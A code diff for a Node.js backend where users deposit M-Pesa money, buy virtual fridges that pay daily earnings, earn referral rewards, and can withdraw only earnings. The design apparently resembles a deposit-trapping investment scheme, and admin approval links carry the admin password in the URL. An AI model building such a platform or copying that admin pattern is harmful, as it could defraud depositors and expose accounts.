@@ -59,15 +59,15 @@ const userSchema = new mongoose.Schema({
   email: String,
   password: String,
   phone: String,
-  depositBalance: { type: Number, default: 0 }, // cannot withdraw
-  earningBalance: { type: Number, default: 0 }, // can withdraw
+  balance: { type: Number, default: 0 },
+  earning: { type: Number, default: 0 },
+  lockedBonus: { type: Number, default: 0 },
   fridges: { type: Array, default: [] },
   referrals: { type: Array, default: [] },
-  createdAt: { type: Date, default: Date.now },
-  withdrawPhone: String,
   referredBy: String,
   lastPaid: String,
-  firstDepositMade: { type: Boolean, default: false }
+  firstDepositMade: { type: Boolean, default: false },
+  createdAt: { type: Date, default: Date.now }
 });
 
 const depositSchema = new mongoose.Schema({
@@ -99,7 +99,8 @@ const Withdrawal = mongoose.model('Withdrawal', withdrawalSchema);
 function auth(req, res, next) {
   const a = req.headers.authorization;
   if (!a || !a.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
-  try { req.user = jwt.verify(a.slice(7), SECRET); next(); } catch { return res.status(401).json({ error: 'Invalid token' }); }
+  try { req.user = jwt.verify(a.slice(7), SECRET); next(); } 
+  catch { return res.status(401).json({ error: 'Invalid token' }); }
 }
 
 async function tgSend(text, buttons) {
@@ -126,19 +127,15 @@ app.post('/api/register', async (req, res) => {
     email, 
     password: hashed, 
     referredBy: ref,
-    depositBalance: 0,
-    earningBalance: 200, // registration bonus
+    balance: 0,
+    earning: 0,
+    lockedBonus: 0,
     firstDepositMade: false
   });
-
   await user.save();
 
   const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
-  res.json({
-    message: 'Registered successfully. You got 200 KSH bonus (cannot withdraw until deposit ≥ 500)',
-    token,
-    email: user.email
-  });
+  res.json({ message: 'Registered successfully', token, email: user.email });
 });
 
 // Login
@@ -149,7 +146,7 @@ app.post('/api/login', async (req, res) => {
   const ok = await bcrypt.compare(password, user.password);
   if (!ok) return res.status(400).json({ error: 'Invalid credentials' });
   const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
-  res.json({ token, email: user.email, phone: user.phone, depositBalance: user.depositBalance, earningBalance: user.earningBalance });
+  res.json({ token, email: user.email, phone: user.phone, balance: user.balance, earning: user.earning });
 });
 
 // Deposit
@@ -157,24 +154,15 @@ app.post('/api/deposit', auth, async (req, res) => {
   const { amount, mpesaCode, phone } = req.body || {};
   if (!amount || !mpesaCode || !phone) return res.status(400).json({ error: 'amount, mpesaCode, phone required' });
 
-  if (!FRIDGES.some(f => f.price === Number(amount))) 
-    return res.status(400).json({ error: 'Deposit the exact amount of the fridge you want' });
-
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
+
+  if (amount < 500) return res.status(400).json({ error: 'Minimum deposit is 500 KES' });
 
   const pending = await Deposit.findOne({ email: u.email, status: 'PENDING' });
   if (pending) return res.status(400).json({ error: 'You have a pending deposit' });
 
-  const deposit = new Deposit({
-    id: crypto.randomUUID(),
-    email: u.email,
-    phone,
-    amount: Number(amount),
-    mpesaCode,
-    status: 'PENDING',
-    requestedAt: Date.now()
-  });
+  const deposit = new Deposit({ id: crypto.randomUUID(), email: u.email, phone, amount: Number(amount), mpesaCode, status: 'PENDING', requestedAt: Date.now() });
   await deposit.save();
 
   const text = `🟢 <b>New Deposit Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nMPESA Code: <b>${mpesaCode}</b>\nDeposit ID: ${deposit.id}\nStatus: PENDING`;
@@ -204,16 +192,28 @@ app.get('/api/admin/deposits/:id/:action', async (req, res) => {
   if (deposit.status === 'APPROVED') {
     const u = await User.findOne({ email: deposit.email });
     if (u) {
-      u.depositBalance += Number(deposit.amount); // add to depositBalance
-      if (!u.firstDepositMade && deposit.amount >= 500) u.firstDepositMade = true;
+      u.balance += Number(deposit.amount); // deposit added to balance
+      u.firstDepositMade = true;
       await u.save();
+
+      // Handle referral reward
+      if (u.referredBy) {
+        const refUser = await User.findOne({ email: u.referredBy });
+        if (refUser) {
+          const rewardRule = REFERRAL_RULES.find(r => deposit.amount >= r.min);
+          if (rewardRule) {
+            refUser.earning += rewardRule.reward;
+            await refUser.save();
+          }
+        }
+      }
     }
   }
 
   res.send(`Deposit ${deposit.status}`);
 });
 
-// Withdraw
+// Withdraw (only from earnings)
 app.post('/api/withdraw', auth, async (req, res) => {
   const { amount, phone } = req.body || {};
   if (!amount || !phone) return res.status(400).json({ error: 'amount & phone required' });
@@ -221,22 +221,15 @@ app.post('/api/withdraw', auth, async (req, res) => {
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
 
-  if (u.earningBalance < Number(amount)) return res.status(400).json({ error: 'Insufficient withdrawable balance (earnings only)' });
+  if (u.earning < Number(amount)) return res.status(400).json({ error: 'Insufficient earnings balance' });
 
   const pending = await Withdrawal.findOne({ email: u.email, status: 'PENDING' });
   if (pending) return res.status(400).json({ error: 'You have a pending withdrawal' });
 
-  const w = new Withdrawal({
-    id: crypto.randomUUID(),
-    email: u.email,
-    phone,
-    amount: Number(amount),
-    status: 'PENDING',
-    requestedAt: Date.now()
-  });
+  const w = new Withdrawal({ id: crypto.randomUUID(), email: u.email, phone, amount: Number(amount), status: 'PENDING', requestedAt: Date.now() });
   await w.save();
 
-  const text = `🔵 <b>New Withdrawal Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nWithdrawable: KES ${u.earningBalance}\nWithdraw ID: ${w.id}\nStatus: PENDING`;
+  const text = `🔵 <b>New Withdrawal Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nEarning Balance: KES ${u.earning}\nWithdraw ID: ${w.id}\nStatus: PENDING`;
   const buttons = [[
     { text: '✅ Approve', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/approve?token=${ADMIN_PASS}` },
     { text: '❌ Reject', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/reject?token=${ADMIN_PASS}` }
@@ -263,7 +256,7 @@ app.get('/api/admin/withdrawals/:id/:action', async (req, res) => {
   if (w.status === 'APPROVED') {
     const u = await User.findOne({ email: w.email });
     if (u) {
-      u.earningBalance -= Number(w.amount); // reduce earnings only
+      u.earning -= Number(w.amount);
       await u.save();
     }
   }
@@ -271,7 +264,7 @@ app.get('/api/admin/withdrawals/:id/:action', async (req, res) => {
   res.send(`Withdrawal ${w.status}`);
 });
 
-// Daily earnings
+// Daily earnings 12:00 AM Nairobi
 async function runDailyEarnings() {
   const users = await User.find();
   const today = new Date().toLocaleDateString('en-GB', { timeZone: 'Africa/Nairobi' });
@@ -283,7 +276,7 @@ async function runDailyEarnings() {
       if (fridge) earn += fridge.dailyEarn;
     }
     if (earn > 0) {
-      u.earningBalance += earn;
+      u.earning += earn; // only earning increases
       u.lastPaid = today;
       await u.save();
     }
@@ -308,27 +301,13 @@ app.post('/api/buy', auth, async (req, res) => {
   const { fridgeId } = req.body || {};
   const item = FRIDGES.find(f => f.id === fridgeId);
   if (!item) return res.status(400).json({ error: 'Invalid fridge' });
-
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
-
-  const totalBalance = u.depositBalance + u.earningBalance;
-  if (totalBalance < item.price) return res.status(400).json({ error: 'Insufficient total balance to buy fridge' });
-
-  // Deduct from deposit first
-  let remainingPrice = item.price;
-  if (u.depositBalance >= remainingPrice) {
-    u.depositBalance -= remainingPrice;
-  } else {
-    remainingPrice -= u.depositBalance;
-    u.depositBalance = 0;
-    u.earningBalance -= remainingPrice;
-  }
-
+  if (u.balance < item.price) return res.status(400).json({ error: 'Insufficient balance' });
+  u.balance -= item.price;
   u.fridges.push({ id: item.id, name: item.name, price: item.price, boughtAt: Date.now() });
   await u.save();
-
-  res.json({ message: `Bought ${item.name}`, depositBalance: u.depositBalance, earningBalance: u.earningBalance });
+  res.json({ message: `Bought ${item.name}`, balance: u.balance });
 });
 
 // Profile
